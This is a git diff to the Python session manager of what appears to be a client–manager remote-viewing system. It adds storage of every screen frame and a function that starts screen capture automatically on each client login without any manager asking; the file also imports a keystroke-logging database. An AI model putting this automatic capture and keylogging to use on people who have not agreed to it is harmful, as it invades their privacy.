@@ -37,6 +37,9 @@ from src.common.network.mcs_layer import MCSLite
 from src.server.core.view_session import ViewSession
 from src.server.core.control_session import ControlSession
 
+# Import Screenshot Storage
+from src.server.core.screenshot_storage import ScreenshotStorage
+
 # Import database cho keylog
 try:
     from src.client.key_log.database import create_keystroke
@@ -62,7 +65,7 @@ class SessionManager(threading.Thread):
         self.authenticated_users = {} # { client_id -> username } (Chỉ user đã login thành công)
         
         # Quản lý Phiên mới: Tách VIEW và CONTROL
-        # VIEW: 1 client có thể có nhiều viewers (1-nhiều) - Chỉ xem màn hình (3s/frame)
+        # VIEW: 1 client có thể có nhiều viewers (1-nhiều) - Chỉ xem màn hình (2s/frame - lưu screenshot thường xuyên)
         self.view_sessions = {}      # { client_id -> ViewSession }
         # CONTROL: 1 client chỉ có 1 controller (1-1 exclusive) - Xem và điều khiển (continuous 30 FPS)
         self.control_sessions = {}   # { client_id -> ControlSession }
@@ -75,6 +78,13 @@ class SessionManager(threading.Thread):
         
         # Pending connection requests (Case 1: Manager connects before Client starts)
         self.pending_requests = {}  # { client_username: manager_id }
+        
+        # Screenshot Storage - Lưu trữ screenshots từ client
+        # Threshold = 0 để lưu TẤT CẢ các frame (không kiểm tra ngưỡng)
+        self.screenshot_storage = ScreenshotStorage(
+            base_path="screenshots",
+            change_threshold=0  # 0 = Lưu mọi thay đổi, không cần kiểm tra ngưỡng
+        )
         
         self.lock = threading.Lock()
 
@@ -226,6 +236,17 @@ class SessionManager(threading.Thread):
                 if not raw_payload:
                     return
                 
+                # LƯU SCREENSHOT (lưu cả FULL và RECT)
+                if pdu_type in ("full", "rect"):
+                    # Lấy username của client từ authenticated_users
+                    client_username = self.authenticated_users.get(client_id)
+                    if client_username:
+                        # Lưu screenshot (không block thread chính)
+                        try:
+                            self.screenshot_storage.save_screenshot_from_raw(client_username, raw_payload)
+                        except Exception as e:
+                            print(f"[SessionManager] ERROR saving screenshot for {client_username}: {e}")
+                
                 with self.lock:
                     # 1. Broadcast tới tất cả viewers (nếu có)
                     if client_id in self.view_sessions:
@@ -324,6 +345,12 @@ class SessionManager(threading.Thread):
                         # Hậu xử lý: Nếu là Client login -> Báo cho Manager biết
                         if requested_role == ROLE_CLIENT:
                             self._broadcast_client_list()
+                            
+                            # TỰ ĐỘNG BẮT SCREEN SHARING cho client này
+                            # Tạo "virtual manager" để kích hoạt VIEW session
+                            print(f"[ScreenshotStorage] Auto-enabling screen capture for {username}")
+                            self._auto_enable_screen_capture(client_id)
+                            
                         elif requested_role == ROLE_MANAGER:
                             self._send_client_list(client_id)
                     else:
@@ -860,3 +887,24 @@ class SessionManager(threading.Thread):
         
         # Cập nhật danh sách client
         self._broadcast_client_list()
+    
+    def _auto_enable_screen_capture(self, client_id):
+        """
+        Tự động bật screen capture cho client (không cần manager)
+        Tạo một VIEW session ảo để client bắt đầu gửi frames
+        """
+        try:
+            with self.lock:
+                # Tạo ViewSession cho client này
+                if client_id not in self.view_sessions:
+                    self.view_sessions[client_id] = ViewSession(client_id, self.broadcaster)
+                    print(f"[ScreenshotStorage] Created ViewSession for auto-capture: {client_id}")
+            
+            # Gửi lệnh bắt đầu VIEW cho client (không cần manager_id)
+            self._send_control_pdu(client_id, f"{CMD_VIEW_STARTED}:auto-capture")
+            print(f"[ScreenshotStorage] Sent VIEW_STARTED to client {client_id} for auto-capture")
+            
+        except Exception as e:
+            print(f"[ScreenshotStorage] ERROR auto-enabling screen capture: {e}")
+            import traceback
+            traceback.print_exc()
